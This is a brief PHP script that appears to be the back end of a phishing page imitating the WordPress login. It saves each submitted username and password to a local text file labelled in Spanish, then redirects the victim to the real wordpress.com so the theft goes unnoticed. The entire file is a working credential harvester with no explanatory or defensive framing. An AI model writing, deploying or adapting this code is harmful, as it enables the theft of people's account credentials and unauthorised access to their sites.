<?php

file_put_contents("datos.txt", "Usuario: " . $_POST['log'] . " Clave: " . $_POST['pwd'] . "\n", FILE_APPEND);
header('Location: https://wordpress.com');
exit();
